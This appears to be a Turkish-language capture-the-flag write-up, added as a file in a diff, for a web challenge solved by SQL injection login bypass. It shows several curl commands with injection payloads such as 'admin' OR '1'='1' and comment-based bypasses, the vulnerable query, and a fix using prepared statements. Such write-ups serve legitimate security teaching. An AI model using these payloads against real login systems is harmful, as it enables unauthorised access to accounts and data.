@@ -1,0 +1,78 @@
+injection3 - Web Challenge
+Açıklama
+Boolean-based Blind SQL Injection kullanarak authentication bypass yapıp flag elde etmek. Uygulama SQL hatalarını göstermiyor, sadece TRUE/FALSE yanıtları veriyor.
+Çözüm
+
+Challenge URL'ine erişildi: http://64.226.74.243:10003/
+Form yapısı cURL ile incelendi:
+
+bashcurl http://64.226.74.243:10003/
+
+Response'da kritik bir ipucu tespit edildi:
+
+Hint: "No errors. Only true or false."
+Method: POST
+Parametreler: username ve password
+Sonuç: Blind SQL Injection challenge'ı!
+
+
+Başarısız giriş denemesi test edildi:
+
+bashcurl -X POST http://64.226.74.243:10003/ -d "username=test&password=test"
+
+Response: "Invalid credentials" (FALSE durumu)
+
+
+Boolean-based SQL Injection payloadu denendi:
+
+bashcurl -X POST http://64.226.74.243:10003/ -d "username=admin' OR '1'='1&password=test"
+
+Payload başarılı oldu ve flag elde edildi
+Alternatif başarılı payloadlar test edildi:
+
+bash# Comment bypass
+curl -X POST http://64.226.74.243:10003/ -d "username=admin'--&password="
+
+# OR 1=1
+curl -X POST http://64.226.74.243:10003/ -d "username=' OR 1=1--&password="
+
+# Boolean TRUE test
+curl -X POST http://64.226.74.243:10003/ -d "username=admin' AND '1'='1'--&password="
+
+# Boolean FALSE test (başarısız)
+curl -X POST http://64.226.74.243:10003/ -d "username=admin' AND '1'='2'--&password="
+Flag
+FLAG{boolenbasedSqliSuccess500dolarbounty48465212387955896}
+Öğrenilenler
+
+Boolean-based Blind SQL Injection
+TRUE/FALSE response analizi
+Error suppression bypass teknikleri
+OR operatörü ile authentication bypass
+SQL operatör önceliği (precedence)
+Blind SQLi vs Error-based SQLi farkı
+Comment-based bypass (--, #)
+
+Kullanılan Araçlar
+
+curl - HTTP client
+Terminal
+
+Zorluk
+⭐ Orta seviye
+Notlar
+Challenge, Blind SQL Injection konseptini gösteriyor. SQL hataları gösterilmiyor ancak TRUE/FALSE yanıtlarından bilgi çıkarılabiliyor. Güvensiz kod: SELECT * FROM users WHERE username = '$username' AND password = '$password' - prepared statement kullanmadan direkt SQL'e ekleniyor. Production'da mutlaka prepared statements kullanılmalı ve hata mesajları loglanmalı ancak kullanıcıya gösterilmemeli.
+Exploit Detayı:
+sql-- Input: username=admin' OR '1'='1, password=test
+-- Oluşan sorgu:
+SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'test'
+
+-- Operatör önceliği:
+SELECT * FROM users WHERE username = 'admin' OR ('1'='1' AND password = 'test')
+
+-- Basitleştirilmiş:
+SELECT * FROM users WHERE username = 'admin' OR TRUE
+
+-- Sonuç: En az 1 satır döner → "Welcome!" + FLAG
+Boolean Logic:
+PayloadMantıkSonuçResponsetest/testNormal loginFALSEInvalid credentialsadmin' OR '1'='1OR TRUETRUEWelcome! + FLAGadmin' AND '1'='2'--AND FALSEFALSEInvalid credentials
